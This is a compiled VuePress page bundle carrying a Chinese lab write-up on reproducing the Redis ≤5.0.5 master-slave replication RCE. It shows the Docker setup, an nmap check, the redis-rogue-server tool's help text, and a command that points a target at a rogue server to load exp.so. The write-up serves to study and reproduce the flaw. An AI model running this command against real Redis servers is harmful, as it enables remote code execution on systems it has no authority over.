import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as r,c as l,a,b as n,d as e,e as p}from"./app-58e4a7d6.js";const i={},c=a("h2",{id:"漏洞描述",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),d=a("p",null,"在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大",-1),u={href:"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf",target:"_blank",rel:"noopener noreferrer"},_=p(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Redis &lt;= 5.0.5
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">docker</span> pull damonevking/redis5.0 
<span class="token function">docker</span> run <span class="token parameter variable">-p</span> <span class="token number">6379</span>:6379 <span class="token parameter variable">-d</span> damonevking/redis5.0 redis-server
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>nmap扫描一下6379端口开放即为搭建成功</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>root@kali:~/桌面<span class="token comment"># docker pull damonevking/redis5.0 </span>
Using default tag: latest

latest: Pulling from damonevking/redis5.0
fc7181108d40: Pull complete 
3e0ac67cad82: Pull complete 
6ee495cb7235: Pull complete 
9f7206d08b9d: Pull complete 
a8354ef8cccb: Pull complete 
53afb10d81c2: Pull complete 
Digest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f
Status: Downloaded newer image <span class="token keyword">for</span> damonevking/redis5.0:latest
docker.io/damonevking/redis5.0:latest
root@kali:~/桌面<span class="token comment"># docker run -p 6379:6379 -d damonevking/redis5.0 redis-server</span>
1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12
root@kali:~/桌面<span class="token comment"># nmap 127.0.0.1 -p 6379</span>
Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2020</span>-12-08 <span class="token number">21</span>:47 CST
Nmap scan report <span class="token keyword">for</span> localhost <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span>
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000099s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE
<span class="token number">6379</span>/tcp <span class="token function">open</span>  redis

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.10</span> seconds
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,7),k={href:"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/n0b0dyCN/redis-rogue-server",target:"_blank",rel:"noopener noreferrer"},m=p(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>➜ ./redis-rogue-server.py <span class="token parameter variable">-h</span>
______         _ _      ______                         _____                          
<span class="token operator">|</span> ___ <span class="token punctuation">\\</span>       <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token operator">|</span> ___ <span class="token punctuation">\\</span>                       /  ___<span class="token operator">|</span>                         
<span class="token operator">|</span> <span class="token operator">|</span>_/ /___  __<span class="token operator">|</span> <span class="token operator">|</span>_ ___  <span class="token operator">|</span> <span class="token operator">|</span>_/ /___   __ _ _   _  ___  <span class="token punctuation">\\</span> <span class="token variable"><span class="token variable">\`</span>--.  ___ _ ____   _____ _ __ 
<span class="token operator">|</span>    // _ <span class="token punctuation">\\</span>/ _<span class="token variable">\`</span></span> <span class="token operator">|</span> / __<span class="token operator">|</span> <span class="token operator">|</span>    // _ <span class="token punctuation">\\</span> / _<span class="token variable"><span class="token variable">\`</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>/ _ <span class="token punctuation">\\</span>  <span class="token variable">\`</span></span>--. <span class="token punctuation">\\</span>/ _ <span class="token punctuation">\\</span> <span class="token string">&#39;__\\ \\ / / _ \\ &#39;</span>__<span class="token operator">|</span>
<span class="token operator">|</span> <span class="token operator">|</span><span class="token punctuation">\\</span> <span class="token punctuation">\\</span>  __/ <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">\\</span>__ <span class="token punctuation">\\</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token punctuation">\\</span> <span class="token punctuation">\\</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>  __/ /<span class="token punctuation">\\</span>__/ /  __/ <span class="token operator">|</span>   <span class="token punctuation">\\</span> V /  __/ <span class="token operator">|</span>   
<span class="token punctuation">\\</span>_<span class="token operator">|</span> <span class="token punctuation">\\</span>_<span class="token punctuation">\\</span>___<span class="token operator">|</span><span class="token punctuation">\\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span>___/ <span class="token punctuation">\\</span>_<span class="token operator">|</span> <span class="token punctuation">\\</span>_<span class="token punctuation">\\</span>___/ <span class="token punctuation">\\</span>__, <span class="token operator">|</span><span class="token punctuation">\\</span>__,_<span class="token operator">|</span><span class="token punctuation">\\</span>___<span class="token operator">|</span> <span class="token punctuation">\\</span>____/ <span class="token punctuation">\\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token punctuation">\\</span>_/ <span class="token punctuation">\\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>   
                                     __/ <span class="token operator">|</span>                                            
                                    <span class="token operator">|</span>___/                                             
@copyright n0b0dy @ r3kapig

Usage: redis-rogue-server.py <span class="token punctuation">[</span>options<span class="token punctuation">]</span>

Options:
  -h, <span class="token parameter variable">--help</span>           show this <span class="token builtin class-name">help</span> message and <span class="token builtin class-name">exit</span>
  <span class="token parameter variable">--rhost</span><span class="token operator">=</span>REMOTE_HOST  target <span class="token function">host</span>
  <span class="token parameter variable">--rport</span><span class="token operator">=</span>REMOTE_PORT  target redis port, default <span class="token number">6379</span>
  <span class="token parameter variable">--lhost</span><span class="token operator">=</span>LOCAL_HOST   rogue server <span class="token function">ip</span>
  <span class="token parameter variable">--lport</span><span class="token operator">=</span>LOCAL_PORT   rogue server listen port, default <span class="token number">21000</span>
  <span class="token parameter variable">--exp</span><span class="token operator">=</span>EXP_FILE       Redis Module to load, default exp.so
  -v, <span class="token parameter variable">--verbose</span>        Show full data stream
Example
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>python3 redis-rogue-server.py <span class="token parameter variable">--rhost</span> <span class="token number">192.168</span>.51.146 <span class="token parameter variable">--lhost</span> <span class="token number">192.168</span>.51.146 <span class="token parameter variable">--exp</span><span class="token operator">=</span>exp.so
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091229797.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091229486.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,4);function b(h,g){const s=o("ExternalLinkIcon");return r(),l("div",null,[c,d,a("p",null,[a("a",u,[n("Pavel Toporkov的分享"),e(s)])]),_,a("p",null,[n("关于漏洞原理请查看"),a("a",k,[n("Pavel Toporkov的分享"),e(s)])]),a("p",null,[n("漏洞利用脚本: "),a("a",v,[n("n0b0dyCN/redis-rogue-server"),e(s)])]),m])}const E=t(i,[["render",b],["__file","Redis 小于5.0.5 主从复制 RCE.html.vue"]]);export{E as default};
